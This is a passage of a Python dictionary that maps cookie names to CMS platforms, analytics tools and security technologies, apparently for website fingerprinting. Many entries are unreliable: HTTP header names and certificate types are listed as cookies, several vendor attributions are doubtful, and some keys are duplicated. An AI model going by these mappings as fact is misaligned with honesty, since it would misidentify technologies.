                'wintercms_session': {'name': 'Winter CMS', 'category': 'cms_platforms'},
                'statamic_session': {'name': 'Statamic', 'category': 'cms_platforms'},
                'kirby_session': {'name': 'Kirby', 'category': 'cms_platforms'},
                'grav_session': {'name': 'Grav', 'category': 'cms_platforms'},
                'pico_session': {'name': 'Pico CMS', 'category': 'cms_platforms'},
                'getgrav_session': {'name': 'Grav', 'category': 'cms_platforms'},
                'processwire_session': {'name': 'ProcessWire', 'category': 'cms_platforms'},
                'wire_session': {'name': 'ProcessWire', 'category': 'cms_platforms'},
                'pagekit_session': {'name': 'Pagekit', 'category': 'cms_platforms'},
                'neos_session': {'name': 'Neos CMS', 'category': 'cms_platforms'},
                'wagtail_session': {'name': 'Wagtail', 'category': 'cms_platforms'},
                'djangocms_session': {'name': 'Django CMS', 'category': 'cms_platforms'},
                'mezzanine_session': {'name': 'Mezzanine', 'category': 'cms_platforms'},
                'feincms_session': {'name': 'FeinCMS', 'category': 'cms_platforms'},
                'oscar_session': {'name': 'Oscar', 'category': 'cms_platforms'},
                'modoboa_session': {'name': 'Modoboa', 'category': 'cms_platforms'},
                'plone_session': {'name': 'Plone', 'category': 'cms_platforms'},
                'zope_session': {'name': 'Zope', 'category': 'cms_platforms'},
                'pyramid_session': {'name': 'Pyramid', 'category': 'cms_platforms'},
                'turbogears_session': {'name': 'TurboGears', 'category': 'cms_platforms'},
                'umbraco_session': {'name': 'Umbraco', 'category': 'cms_platforms'},
                'orchard_session': {'name': 'Orchard', 'category': 'cms_platforms'},
                'kentico_session': {'name': 'Kentico', 'category': 'cms_platforms'},
                'sitecore_session': {'name': 'Sitecore', 'category': 'cms_platforms'},
                'episerver_session': {'name': 'Episerver', 'category': 'cms_platforms'},
                'optimizely_session': {'name': 'Optimizely', 'category': 'cms_platforms'},
                'dotcms_session': {'name': 'dotCMS', 'category': 'cms_platforms'},
                'sitefinity_session': {'name': 'Sitefinity', 'category': 'cms_platforms'},
                'dnn_session': {'name': 'DNN', 'category': 'cms_platforms'},
                'nopcommerce_session': {'name': 'nopCommerce', 'category': 'cms_platforms'},
                'grandnode_session': {'name': 'GrandNode', 'category': 'cms_platforms'},
                'smartstore_session': {'name': 'SmartStore', 'category': 'cms_platforms'},
                'virtocommerce_session': {'name': 'Virto Commerce', 'category': 'cms_platforms'},
                
                # Analytics & Marketing Tools
                '_ga': {'name': 'Google Analytics', 'category': 'analytics_tools'},
                '_ga_': {'name': 'Google Analytics 4', 'category': 'analytics_tools'},
                '_gid': {'name': 'Google Analytics', 'category': 'analytics_tools'},
                '_gat': {'name': 'Google Analytics', 'category': 'analytics_tools'},
                '_gat_gtag': {'name': 'Google Analytics', 'category': 'analytics_tools'},
                '_gat_UA': {'name': 'Google Analytics', 'category': 'analytics_tools'},
                '_gcl_au': {'name': 'Google Ads', 'category': 'analytics_tools'},
                '_gcl_aw': {'name': 'Google Ads', 'category': 'analytics_tools'},
                '_gcl_dc': {'name': 'Google Ads', 'category': 'analytics_tools'},
                '_gcl_gb': {'name': 'Google Ads', 'category': 'analytics_tools'},
                '_gcl_gf': {'name': 'Google Ads', 'category': 'analytics_tools'},
                '_gcl_ha': {'name': 'Google Ads', 'category': 'analytics_tools'},
                '_gtm': {'name': 'Google Tag Manager', 'category': 'analytics_tools'},
                '_dc_gtm': {'name': 'Google Tag Manager', 'category': 'analytics_tools'},
                'AMP_TOKEN': {'name': 'Google AMP', 'category': 'analytics_tools'},
                '_gac': {'name': 'Google Ads Conversion', 'category': 'analytics_tools'},
                'goog_pem_mod': {'name': 'Google Privacy Enhanced Mode', 'category': 'analytics_tools'},
                'google_experiment_mod': {'name': 'Google Optimize', 'category': 'analytics_tools'},
                '_gaexp': {'name': 'Google Optimize', 'category': 'analytics_tools'},
                '_opt_awcid': {'name': 'Google Optimize', 'category': 'analytics_tools'},
                '_opt_awmid': {'name': 'Google Optimize', 'category': 'analytics_tools'},
                '_opt_awgid': {'name': 'Google Optimize', 'category': 'analytics_tools'},
                '_opt_awkid': {'name': 'Google Optimize', 'category': 'analytics_tools'},
                '_opt_utmc': {'name': 'Google Optimize', 'category': 'analytics_tools'},
                'fbp': {'name': 'Facebook Pixel', 'category': 'analytics_tools'},
                'fbsr': {'name': 'Facebook SDK', 'category': 'analytics_tools'},
                '_fbp': {'name': 'Facebook Pixel', 'category': 'analytics_tools'},
                '_fbc': {'name': 'Facebook Click ID', 'category': 'analytics_tools'},
                'fb_exchange_token': {'name': 'Facebook', 'category': 'analytics_tools'},
                'fbm': {'name': 'Facebook Messenger', 'category': 'analytics_tools'},
                'datr': {'name': 'Facebook', 'category': 'analytics_tools'},
                'sb': {'name': 'Facebook', 'category': 'analytics_tools'},
                'wd': {'name': 'Facebook', 'category': 'analytics_tools'},
                'c_user': {'name': 'Facebook', 'category': 'analytics_tools'},
                'xs': {'name': 'Facebook', 'category': 'analytics_tools'},
                'fr': {'name': 'Facebook', 'category': 'analytics_tools'},
                'act': {'name': 'Facebook', 'category': 'analytics_tools'},
                'spin': {'name': 'Facebook', 'category': 'analytics_tools'},
                'presence': {'name': 'Facebook', 'category': 'analytics_tools'},
                'locale': {'name': 'Facebook', 'category': 'analytics_tools'},
                'a11y': {'name': 'Facebook', 'category': 'analytics_tools'},
                '_pk_id': {'name': 'Matomo', 'category': 'analytics_tools'},
                '_pk_ref': {'name': 'Matomo', 'category': 'analytics_tools'},
                '_pk_ses': {'name': 'Matomo', 'category': 'analytics_tools'},
                '_pk_cvar': {'name': 'Matomo', 'category': 'analytics_tools'},
                '_pk_hsr': {'name': 'Matomo', 'category': 'analytics_tools'},
                'piwik_session': {'name': 'Matomo/Piwik', 'category': 'analytics_tools'},
                'piwik_ignore': {'name': 'Matomo/Piwik', 'category': 'analytics_tools'},
                'mtm_campaign': {'name': 'Matomo', 'category': 'analytics_tools'},
                'mtm_keyword': {'name': 'Matomo', 'category': 'analytics_tools'},
                'mtm_source': {'name': 'Matomo', 'category': 'analytics_tools'},
                'mtm_medium': {'name': 'Matomo', 'category': 'analytics_tools'},
                'mtm_content': {'name': 'Matomo', 'category': 'analytics_tools'},
                'mtm_group': {'name': 'Matomo', 'category': 'analytics_tools'},
                'mtm_placement': {'name': 'Matomo', 'category': 'analytics_tools'},
                '_hjSessionUser': {'name': 'Hotjar', 'category': 'analytics_tools'},
                '_hjSession': {'name': 'Hotjar', 'category': 'analytics_tools'},
                '_hjIncludedInSessionSample': {'name': 'Hotjar', 'category': 'analytics_tools'},
                '_hjIncludedInPageviewSample': {'name': 'Hotjar', 'category': 'analytics_tools'},
                '_hjAbsoluteSessionInProgress': {'name': 'Hotjar', 'category': 'analytics_tools'},
                '_hjFirstSeen': {'name': 'Hotjar', 'category': 'analytics_tools'},
                '_hjViewportId': {'name': 'Hotjar', 'category': 'analytics_tools'},
                '_hjRecordingLastActivity': {'name': 'Hotjar', 'category': 'analytics_tools'},
                'hjActiveViewportIds': {'name': 'Hotjar', 'category': 'analytics_tools'},
                'hjViewportId': {'name': 'Hotjar', 'category': 'analytics_tools'},
                '_hjRecordingEnabled': {'name': 'Hotjar', 'category': 'analytics_tools'},
                '_hjRecordingLastActivity': {'name': 'Hotjar', 'category': 'analytics_tools'},
                '_hjTLDTest': {'name': 'Hotjar', 'category': 'analytics_tools'},
                '_hjUserAttributesHash': {'name': 'Hotjar', 'category': 'analytics_tools'},
                '_hjCachedUserAttributes': {'name': 'Hotjar', 'category': 'analytics_tools'},
                '_hjLocalStorageTest': {'name': 'Hotjar', 'category': 'analytics_tools'},
                '_hjIncludedInSample': {'name': 'Hotjar', 'category': 'analytics_tools'},
                'ajs_user_id': {'name': 'Segment', 'category': 'analytics_tools'},
                'ajs_group_id': {'name': 'Segment', 'category': 'analytics_tools'},
                'ajs_anonymous_id': {'name': 'Segment', 'category': 'analytics_tools'},
                'ajs_user_traits': {'name': 'Segment', 'category': 'analytics_tools'},
                'ajs_group_properties': {'name': 'Segment', 'category': 'analytics_tools'},
                'amplitude_id': {'name': 'Amplitude', 'category': 'analytics_tools'},
                'amplitude_sessionId': {'name': 'Amplitude', 'category': 'analytics_tools'},
                'amplitude_device_id': {'name': 'Amplitude', 'category': 'analytics_tools'},
                'amplitude_unsent': {'name': 'Amplitude', 'category': 'analytics_tools'},
                'amplitude_cookie_test': {'name': 'Amplitude', 'category': 'analytics_tools'},
                '_clck': {'name': 'Microsoft Clarity', 'category': 'analytics_tools'},
                '_clsk': {'name': 'Microsoft Clarity', 'category': 'analytics_tools'},
                'CLID': {'name': 'Microsoft Clarity', 'category': 'analytics_tools'},
                'ANONCHK': {'name': 'Microsoft Clarity', 'category': 'analytics_tools'},
                'MR': {'name': 'Microsoft Clarity', 'category': 'analytics_tools'},
                'MUID': {'name': 'Microsoft Clarity', 'category': 'analytics_tools'},
                'SM': {'name': 'Microsoft Clarity', 'category': 'analytics_tools'},
                '_uetsid': {'name': 'Microsoft Bing', 'category': 'analytics_tools'},
                '_uetvid': {'name': 'Microsoft Bing', 'category': 'analytics_tools'},
                'MUIDB': {'name': 'Microsoft Bing', 'category': 'analytics_tools'},
                '_tt_enable_cookie': {'name': 'TikTok Pixel', 'category': 'analytics_tools'},
                '_ttp': {'name': 'TikTok Pixel', 'category': 'analytics_tools'},
                'ttclid': {'name': 'TikTok', 'category': 'analytics_tools'},
                '_pin_unauth': {'name': 'Pinterest', 'category': 'analytics_tools'},
                '_pinterest_sess': {'name': 'Pinterest', 'category': 'analytics_tools'},
                '_pinterest_ct_ua': {'name': 'Pinterest', 'category': 'analytics_tools'},
                '_pinterest_ct_rt': {'name': 'Pinterest', 'category': 'analytics_tools'},
                '_derived_epik': {'name': 'Pinterest', 'category': 'analytics_tools'},
                '_epik': {'name': 'Pinterest', 'category': 'analytics_tools'},
                'li_at': {'name': 'LinkedIn', 'category': 'analytics_tools'},
                'li_rm': {'name': 'LinkedIn', 'category': 'analytics_tools'},
                'lidc': {'name': 'LinkedIn', 'category': 'analytics_tools'},
                'UserMatchHistory': {'name': 'LinkedIn', 'category': 'analytics_tools'},
                'AnalyticsSyncHistory': {'name': 'LinkedIn', 'category': 'analytics_tools'},
                'lms_ads': {'name': 'LinkedIn', 'category': 'analytics_tools'},
                'lms_analytics': {'name': 'LinkedIn', 'category': 'analytics_tools'},
                'bcookie': {'name': 'LinkedIn', 'category': 'analytics_tools'},
                'bscookie': {'name': 'LinkedIn', 'category': 'analytics_tools'},
                'lang': {'name': 'LinkedIn', 'category': 'analytics_tools'},
                'JSESSIONID': {'name': 'LinkedIn', 'category': 'analytics_tools'},
                'visit': {'name': 'LinkedIn', 'category': 'analytics_tools'},
                '_gcl_au': {'name': 'Google Ads Conversion Linker', 'category': 'analytics_tools'},
                'ads_prefs': {'name': 'Google Ads', 'category': 'analytics_tools'},
                '__gads': {'name': 'Google AdSense', 'category': 'analytics_tools'},
                '__gpi': {'name': 'Google Publisher Tags', 'category': 'analytics_tools'},
                'googleads': {'name': 'Google Ads', 'category': 'analytics_tools'},
                'googtrans': {'name': 'Google Translate', 'category': 'analytics_tools'},
                'googlelang': {'name': 'Google Translate', 'category': 'analytics_tools'},
                'client_id': {'name': 'Google Client ID', 'category': 'analytics_tools'},
                'VISITOR_INFO1_LIVE': {'name': 'YouTube', 'category': 'analytics_tools'},
                'YSC': {'name': 'YouTube', 'category': 'analytics_tools'},
                'PREF': {'name': 'YouTube', 'category': 'analytics_tools'},
                'CONSENT': {'name': 'YouTube', 'category': 'analytics_tools'},
                'GPS': {'name': 'YouTube', 'category': 'analytics_tools'},
                'IDE': {'name': 'Google DoubleClick', 'category': 'analytics_tools'},
                'DSID': {'name': 'Google DoubleClick', 'category': 'analytics_tools'},
                'FLC': {'name': 'Google DoubleClick', 'category': 'analytics_tools'},
                'AID': {'name': 'Google DoubleClick', 'category': 'analytics_tools'},
                'TAID': {'name': 'Google DoubleClick', 'category': 'analytics_tools'},
                'exchange_uid': {'name': 'Google DoubleClick', 'category': 'analytics_tools'},
                'id': {'name': 'Google DoubleClick', 'category': 'analytics_tools'},
                'pm-adsense': {'name': 'Google AdSense', 'category': 'analytics_tools'},
                'google_adsense_settings': {'name': 'Google AdSense', 'category': 'analytics_tools'},
                'google_adsense_consent': {'name': 'Google AdSense', 'category': 'analytics_tools'},
                'ad_storage': {'name': 'Google Ads Storage', 'category': 'analytics_tools'},
                'analytics_storage': {'name': 'Google Analytics Storage', 'category': 'analytics_tools'},
                'ad_user_data': {'name': 'Google Ads User Data', 'category': 'analytics_tools'},
                'ad_personalization': {'name': 'Google Ads Personalization', 'category': 'analytics_tools'},
                'functionality_storage': {'name': 'Google Functionality Storage', 'category': 'analytics_tools'},
                'personalization_storage': {'name': 'Google Personalization Storage', 'category': 'analytics_tools'},
                'security_storage': {'name': 'Google Security Storage', 'category': 'analytics_tools'},
                'wait_for_update': {'name': 'Google Consent Mode', 'category': 'analytics_tools'},
                'region': {'name': 'Google Consent Mode', 'category': 'analytics_tools'},
                
                # Security Technologies
                'sucuri_cloudproxy_uuid': {'name': 'Sucuri', 'category': 'security_technologies'},
                'wf_loginalerted': {'name': 'Wordfence', 'category': 'security_technologies'},
                'wfvt': {'name': 'Wordfence', 'category': 'security_technologies'},
                'wordfence_verifiedHuman': {'name': 'Wordfence', 'category': 'security_technologies'},
                'wfwaf-authcookie': {'name': 'Wordfence', 'category': 'security_technologies'},
                'incap_ses': {'name': 'Imperva', 'category': 'security_technologies'},
                'incap_visid': {'name': 'Imperva', 'category': 'security_technologies'},
                'incap_usr': {'name': 'Imperva', 'category': 'security_technologies'},
                'incap_ref': {'name': 'Imperva', 'category': 'security_technologies'},
                'incap_geo': {'name': 'Imperva', 'category': 'security_technologies'},
                'nlbi': {'name': 'Imperva', 'category': 'security_technologies'},
                'visid_incap': {'name': 'Imperva', 'category': 'security_technologies'},
                '__cf_bm': {'name': 'Cloudflare Bot Management', 'category': 'security_technologies'},
                'cf_clearance': {'name': 'Cloudflare', 'category': 'security_technologies'},
                'cf_ray': {'name': 'Cloudflare', 'category': 'security_technologies'},
                'cf_use_ob': {'name': 'Cloudflare', 'category': 'security_technologies'},
                'cf_ob_info': {'name': 'Cloudflare', 'category': 'security_technologies'},
                'cf_chl_rc_i': {'name': 'Cloudflare Challenge', 'category': 'security_technologies'},
                'cf_chl_rc_ni': {'name': 'Cloudflare Challenge', 'category': 'security_technologies'},
                'cf_chl_seq': {'name': 'Cloudflare Challenge', 'category': 'security_technologies'},
                'cf_chl_prog': {'name': 'Cloudflare Challenge', 'category': 'security_technologies'},
                'cf_mitigated': {'name': 'Cloudflare', 'category': 'security_technologies'},
                'cf_edge_cache': {'name': 'Cloudflare', 'category': 'security_technologies'},
                'csrftoken': {'name': 'CSRF Token', 'category': 'security_technologies'},
                '_csrf': {'name': 'CSRF Token', 'category': 'security_technologies'},
                'csrf_token': {'name': 'CSRF Token', 'category': 'security_technologies'},
                'XSRF-TOKEN': {'name': 'XSRF Token', 'category': 'security_technologies'},
                '_token': {'name': 'Security Token', 'category': 'security_technologies'},
                'authenticity_token': {'name': 'Rails Authenticity Token', 'category': 'security_technologies'},
                'anti_csrf_token': {'name': 'Anti-CSRF Token', 'category': 'security_technologies'},
                'request_token': {'name': 'Request Token', 'category': 'security_technologies'},
                'form_token': {'name': 'Form Token', 'category': 'security_technologies'},
                'security_token': {'name': 'Security Token', 'category': 'security_technologies'},
                'nonce': {'name': 'Nonce', 'category': 'security_technologies'},
                '_nonce': {'name': 'Nonce', 'category': 'security_technologies'},
                'wp_nonce': {'name': 'WordPress Nonce', 'category': 'security_technologies'},
                'recaptcha': {'name': 'reCAPTCHA', 'category': 'security_technologies'},
                'g-recaptcha-response': {'name': 'reCAPTCHA', 'category': 'security_technologies'},
                'h-captcha-response': {'name': 'hCaptcha', 'category': 'security_technologies'},
                'hcaptcha': {'name': 'hCaptcha', 'category': 'security_technologies'},
                'turnstile': {'name': 'Cloudflare Turnstile', 'category': 'security_technologies'},
                'cf-turnstile-response': {'name': 'Cloudflare Turnstile', 'category': 'security_technologies'},
                'akismet': {'name': 'Akismet', 'category': 'security_technologies'},
                'akismet_comment_nonce': {'name': 'Akismet', 'category': 'security_technologies'},
                'shield_session': {'name': 'Shield Security', 'category': 'security_technologies'},
                'ithemes_security': {'name': 'iThemes Security', 'category': 'security_technologies'},
                'all_in_one_wp_security': {'name': 'All In One WP Security', 'category': 'security_technologies'},
                'bulletproof_security': {'name': 'BulletProof Security', 'category': 'security_technologies'},
                'secupress': {'name': 'SecuPress', 'category': 'security_technologies'},
                'wp_security_audit_log': {'name': 'WP Security Audit Log', 'category': 'security_technologies'},
                'defender': {'name': 'Defender', 'category': 'security_technologies'},
                'jetpack_sso': {'name': 'Jetpack SSO', 'category': 'security_technologies'},
                'jetpack_protect': {'name': 'Jetpack Protect', 'category': 'security_technologies'},
                'two_factor': {'name': 'Two Factor Authentication', 'category': 'security_technologies'},
                '2fa': {'name': 'Two Factor Authentication', 'category': 'security_technologies'},
                'otp': {'name': 'One Time Password', 'category': 'security_technologies'},
                'totp': {'name': 'Time-based OTP', 'category': 'security_technologies'},
                'authy': {'name': 'Authy', 'category': 'security_technologies'},
                'google_authenticator': {'name': 'Google Authenticator', 'category': 'security_technologies'},
                'duo_security': {'name': 'Duo Security', 'category': 'security_technologies'},
                'okta': {'name': 'Okta', 'category': 'security_technologies'},
                'auth0': {'name': 'Auth0', 'category': 'security_technologies'},
                'firebase_auth': {'name': 'Firebase Auth', 'category': 'security_technologies'},
                'aws_cognito': {'name': 'AWS Cognito', 'category': 'security_technologies'},
                'azure_ad': {'name': 'Azure Active Directory', 'category': 'security_technologies'},
                'saml': {'name': 'SAML', 'category': 'security_technologies'},
                'oauth': {'name': 'OAuth', 'category': 'security_technologies'},
                'openid': {'name': 'OpenID', 'category': 'security_technologies'},
                'jwt': {'name': 'JSON Web Token', 'category': 'security_technologies'},
                'bearer_token': {'name': 'Bearer Token', 'category': 'security_technologies'},
                'api_key': {'name': 'API Key', 'category': 'security_technologies'},
                'access_token': {'name': 'Access Token', 'category': 'security_technologies'},
                'refresh_token': {'name': 'Refresh Token', 'category': 'security_technologies'},
                'id_token': {'name': 'ID Token', 'category': 'security_technologies'},
                'session_token': {'name': 'Session Token', 'category': 'security_technologies'},
                'remember_token': {'name': 'Remember Token', 'category': 'security_technologies'},
                'login_token': {'name': 'Login Token', 'category': 'security_technologies'},
                'password_reset_token': {'name': 'Password Reset Token', 'category': 'security_technologies'},
                'email_verification_token': {'name': 'Email Verification Token', 'category': 'security_technologies'},
                'activation_token': {'name': 'Activation Token', 'category': 'security_technologies'},
                'verification_code': {'name': 'Verification Code', 'category': 'security_technologies'},
                'confirmation_code': {'name': 'Confirmation Code', 'category': 'security_technologies'},
                'challenge_code': {'name': 'Challenge Code', 'category': 'security_technologies'},
                'pin_code': {'name': 'PIN Code', 'category': 'security_technologies'},
                'backup_code': {'name': 'Backup Code', 'category': 'security_technologies'},
                'recovery_code': {'name': 'Recovery Code', 'category': 'security_technologies'},
                'emergency_code': {'name': 'Emergency Code', 'category': 'security_technologies'},
                'single_use_token': {'name': 'Single Use Token', 'category': 'security_technologies'},
                'temporary_token': {'name': 'Temporary Token', 'category': 'security_technologies'},
                'magic_link': {'name': 'Magic Link', 'category': 'security_technologies'},
                'passwordless': {'name': 'Passwordless Auth', 'category': 'security_technologies'},
                'biometric': {'name': 'Biometric Auth', 'category': 'security_technologies'},
                'fingerprint': {'name': 'Fingerprint Auth', 'category': 'security_technologies'},
                'face_id': {'name': 'Face ID', 'category': 'security_technologies'},
                'touch_id': {'name': 'Touch ID', 'category': 'security_technologies'},
                'windows_hello': {'name': 'Windows Hello', 'category': 'security_technologies'},
                'webauthn': {'name': 'WebAuthn', 'category': 'security_technologies'},
                'fido': {'name': 'FIDO', 'category': 'security_technologies'},
                'yubikey': {'name': 'YubiKey', 'category': 'security_technologies'},
                'hardware_token': {'name': 'Hardware Token', 'category': 'security_technologies'},
                'smart_card': {'name': 'Smart Card', 'category': 'security_technologies'},
                'pki': {'name': 'PKI Certificate', 'category': 'security_technologies'},
                'client_cert': {'name': 'Client Certificate', 'category': 'security_technologies'},
                'ssl_cert': {'name': 'SSL Certificate', 'category': 'security_technologies'},
                'tls_cert': {'name': 'TLS Certificate', 'category': 'security_technologies'},
                'certificate': {'name': 'Digital Certificate', 'category': 'security_technologies'},
                'ca_cert': {'name': 'CA Certificate', 'category': 'security_technologies'},
                'root_cert': {'name': 'Root Certificate', 'category': 'security_technologies'},
                'intermediate_cert': {'name': 'Intermediate Certificate', 'category': 'security_technologies'},
                'end_entity_cert': {'name': 'End Entity Certificate', 'category': 'security_technologies'},
                'self_signed_cert': {'name': 'Self-Signed Certificate', 'category': 'security_technologies'},
                'wildcard_cert': {'name': 'Wildcard Certificate', 'category': 'security_technologies'},
                'multi_domain_cert': {'name': 'Multi-Domain Certificate', 'category': 'security_technologies'},
                'extended_validation_cert': {'name': 'Extended Validation Certificate', 'category': 'security_technologies'},
                'domain_validation_cert': {'name': 'Domain Validation Certificate', 'category': 'security_technologies'},
                'organization_validation_cert': {'name': 'Organization Validation Certificate', 'category': 'security_technologies'},
                'code_signing_cert': {'name': 'Code Signing Certificate', 'category': 'security_technologies'},
                'timestamping_cert': {'name': 'Timestamping Certificate', 'category': 'security_technologies'},
                'ocsp_cert': {'name': 'OCSP Certificate', 'category': 'security_technologies'},
                'crl_cert': {'name': 'CRL Certificate', 'category': 'security_technologies'},
                'revocation_cert': {'name': 'Revocation Certificate', 'category': 'security_technologies'},
                'expired_cert': {'name': 'Expired Certificate', 'category': 'security_technologies'},
                'invalid_cert': {'name': 'Invalid Certificate', 'category': 'security_technologies'},
                'trusted_cert': {'name': 'Trusted Certificate', 'category': 'security_technologies'},
                'untrusted_cert': {'name': 'Untrusted Certificate', 'category': 'security_technologies'},
                'verified_cert': {'name': 'Verified Certificate', 'category': 'security_technologies'},
                'unverified_cert': {'name': 'Unverified Certificate', 'category': 'security_technologies'},
                'pinned_cert': {'name': 'Certificate Pinning', 'category': 'security_technologies'},
                'ct_log': {'name': 'Certificate Transparency', 'category': 'security_technologies'},
                'sct': {'name': 'Signed Certificate Timestamp', 'category': 'security_technologies'},
                'hsts': {'name': 'HTTP Strict Transport Security', 'category': 'security_technologies'},
                'hpkp': {'name': 'HTTP Public Key Pinning', 'category': 'security_technologies'},
                'csp': {'name': 'Content Security Policy', 'category': 'security_technologies'},
                'x_frame_options': {'name': 'X-Frame-Options', 'category': 'security_technologies'},
                'x_content_type_options': {'name': 'X-Content-Type-Options', 'category': 'security_technologies'},
                'x_xss_protection': {'name': 'X-XSS-Protection', 'category': 'security_technologies'},
                'referrer_policy': {'name': 'Referrer Policy', 'category': 'security_technologies'},
                'feature_policy': {'name': 'Feature Policy', 'category': 'security_technologies'},
                'permissions_policy': {'name': 'Permissions Policy', 'category': 'security_technologies'},
                'expect_ct': {'name': 'Expect-CT', 'category': 'security_technologies'},
                'expect_staple': {'name': 'Expect-Staple', 'category': 'security_technologies'},
                'cross_origin_embedder_policy': {'name': 'Cross-Origin-Embedder-Policy', 'category': 'security_technologies'},
                'cross_origin_opener_policy': {'name': 'Cross-Origin-Opener-Policy', 'category': 'security_technologies'},
                'cross_origin_resource_policy': {'name': 'Cross-Origin-Resource-Policy', 'category': 'security_technologies'},
                'origin_agent_cluster': {'name': 'Origin-Agent-Cluster', 'category': 'security_technologies'},
                'sec_fetch_site': {'name': 'Sec-Fetch-Site', 'category': 'security_technologies'},
                'sec_fetch_mode': {'name': 'Sec-Fetch-Mode', 'category': 'security_technologies'},
                'sec_fetch_user': {'name': 'Sec-Fetch-User', 'category': 'security_technologies'},
                'sec_fetch_dest': {'name': 'Sec-Fetch-Dest', 'category': 'security_technologies'},
                'sec_websocket_protocol': {'name': 'Sec-WebSocket-Protocol', 'category': 'security_technologies'},
                'sec_websocket_extensions': {'name': 'Sec-WebSocket-Extensions', 'category': 'security_technologies'},
                'sec_websocket_key': {'name': 'Sec-WebSocket-Key', 'category': 'security_technologies'},
                'sec_websocket_accept': {'name': 'Sec-WebSocket-Accept', 'category': 'security_technologies'},
                'sec_websocket_version': {'name': 'Sec-WebSocket-Version', 'category': 'security_technologies'},
                'upgrade_insecure_requests': {'name': 'Upgrade-Insecure-Requests', 'category': 'security_technologies'},
                'vary': {'name': 'Vary Header', 'category': 'security_technologies'},
                'cache_control': {'name': 'Cache-Control', 'category': 'security_technologies'},
                'pragma': {'name': 'Pragma', 'category': 'security_technologies'},
                'expires': {'name': 'Expires', 'category': 'security_technologies'},
                'etag': {'name': 'ETag', 'category': 'security_technologies'},
                'last_modified': {'name': 'Last-Modified', 'category': 'security_technologies'},
                'if_modified_since': {'name': 'If-Modified-Since', 'category': 'security_technologies'},
                'if_none_match': {'name': 'If-None-Match', 'category': 'security_technologies'},
                'if_match': {'name': 'If-Match', 'category': 'security_technologies'},
                'if_unmodified_since': {'name': 'If-Unmodified-Since', 'category': 'security_technologies'},
                'if_range': {'name': 'If-Range', 'category': 'security_technologies'},
                'range': {'name': 'Range', 'category': 'security_technologies'},
                'content_range': {'name': 'Content-Range', 'category': 'security_technologies'},
                'accept_ranges': {'name': 'Accept-Ranges', 'category': 'security_technologies'},
                'content_length': {'name': 'Content-Length', 'category': 'security_technologies'},
                'content_type': {'name': 'Content-Type', 'category': 'security_technologies'},
                'content_encoding': {'name': 'Content-Encoding', 'category': 'security_technologies'},
                'content_language': {'name': 'Content-Language', 'category': 'security_technologies'},
                'content_location': {'name': 'Content-Location', 'category': 'security_technologies'},
                'content_md5': {'name': 'Content-MD5', 'category': 'security_technologies'},
                'content_disposition': {'name': 'Content-Disposition', 'category': 'security_technologies'},
                'transfer_encoding': {'name': 'Transfer-Encoding', 'category': 'security_technologies'},
                'te': {'name': 'TE', 'category': 'security_technologies'},
                'trailer': {'name': 'Trailer', 'category': 'security_technologies'},
                'connection': {'name': 'Connection', 'category': 'security_technologies'},
                'keep_alive': {'name': 'Keep-Alive', 'category': 'security_technologies'},
                'proxy_authenticate': {'name': 'Proxy-Authenticate', 'category': 'security_technologies'},
                'proxy_authorization': {'name': 'Proxy-Authorization', 'category': 'security_technologies'},
                'www_authenticate': {'name': 'WWW-Authenticate', 'category': 'security_technologies'},
                'authorization': {'name': 'Authorization', 'category': 'security_technologies'},
                'authentication_info': {'name': 'Authentication-Info', 'category': 'security_technologies'},
                'proxy_authentication_info': {'name': 'Proxy-Authentication-Info', 'category': 'security_technologies'},
                'digest': {'name': 'Digest Authentication', 'category': 'security_technologies'},
                'basic': {'name': 'Basic Authentication', 'category': 'security_technologies'},
                'bearer': {'name': 'Bearer Authentication', 'category': 'security_technologies'},
                'negotiate': {'name': 'Negotiate Authentication', 'category': 'security_technologies'},
                'ntlm': {'name': 'NTLM Authentication', 'category': 'security_technologies'},
                'kerberos': {'name': 'Kerberos Authentication', 'category': 'security_technologies'},
                'oauth2': {'name': 'OAuth 2.0', 'category': 'security_technologies'},
                'openid_connect': {'name': 'OpenID Connect', 'category': 'security_technologies'},
                'saml2': {'name': 'SAML 2.0', 'category': 'security_technologies'},
                'cas': {'name': 'Central Authentication Service', 'category': 'security_technologies'},
                'ldap': {'name': 'LDAP Authentication', 'category': 'security_technologies'},
                'active_directory': {'name': 'Active Directory', 'category': 'security_technologies'},
                'radius': {'name': 'RADIUS Authentication', 'category': 'security_technologies'},
                'tacacs': {'name': 'TACACS+ Authentication', 'category': 'security_technologies'},
                'pam': {'name': 'PAM Authentication', 'category': 'security_technologies'},
                'ssh_key': {'name': 'SSH Key Authentication', 'category': 'security_technologies'},
                'x509': {'name': 'X.509 Authentication', 'category': 'security_technologies'},
                'mutual_tls': {'name': 'Mutual TLS', 'category': 'security_technologies'},
                'client_cert_auth': {'name': 'Client Certificate Authentication', 'category': 'security_technologies'},
                'api_key_auth': {'name': 'API Key Authentication', 'category': 'security_technologies'},
                'hmac': {'name': 'HMAC Authentication', 'category': 'security_technologies'},
                'signature': {'name': 'Signature Authentication', 'category': 'security_technologies'},
                'webhook_signature': {'name': 'Webhook Signature', 'category': 'security_technologies'},
                'github_signature': {'name': 'GitHub Webhook Signature', 'category': 'security_technologies'},
                'stripe_signature': {'name': 'Stripe Webhook Signature', 'category': 'security_technologies'},
                'paypal_signature': {'name': 'PayPal Signature', 'category': 'security_technologies'},
                'amazon_signature': {'name': 'Amazon Signature', 'category': 'security_technologies'},
                'aws_signature': {'name': 'AWS Signature', 'category': 'security_technologies'},
                'azure_signature': {'name': 'Azure Signature', 'category': 'security_technologies'},
                'google_signature': {'name': 'Google Signature', 'category': 'security_technologies'},
                'microsoft_signature': {'name': 'Microsoft Signature', 'category': 'security_technologies'},
                'apple_signature': {'name': 'Apple Signature', 'category': 'security_technologies'},
                'facebook_signature': {'name': 'Facebook Signature', 'category': 'security_technologies'},
                'twitter_signature': {'name': 'Twitter Signature', 'category': 'security_technologies'},
                'linkedin_signature': {'name': 'LinkedIn Signature', 'category': 'security_technologies'},
                'slack_signature': {'name': 'Slack Signature', 'category': 'security_technologies'},
                'discord_signature': {'name': 'Discord Signature', 'category': 'security_technologies'},
                'telegram_signature': {'name': 'Telegram Signature', 'category': 'security_technologies'},
                'whatsapp_signature': {'name': 'WhatsApp Signature', 'category': 'security_technologies'},
                'twilio_signature': {'name': 'Twilio Signature', 'category': 'security_technologies'},
                'sendgrid_signature': {'name': 'SendGrid Signature', 'category': 'security_technologies'},
                'mailgun_signature': {'name': 'Mailgun Signature', 'category': 'security_technologies'},
                'shopify_signature': {'name': 'Shopify Signature', 'category': 'security_technologies'},
                'woocommerce_signature': {'name': 'WooCommerce Signature', 'category': 'security_technologies'},
                'magento_signature': {'name': 'Magento Signature', 'category': 'security_technologies'},
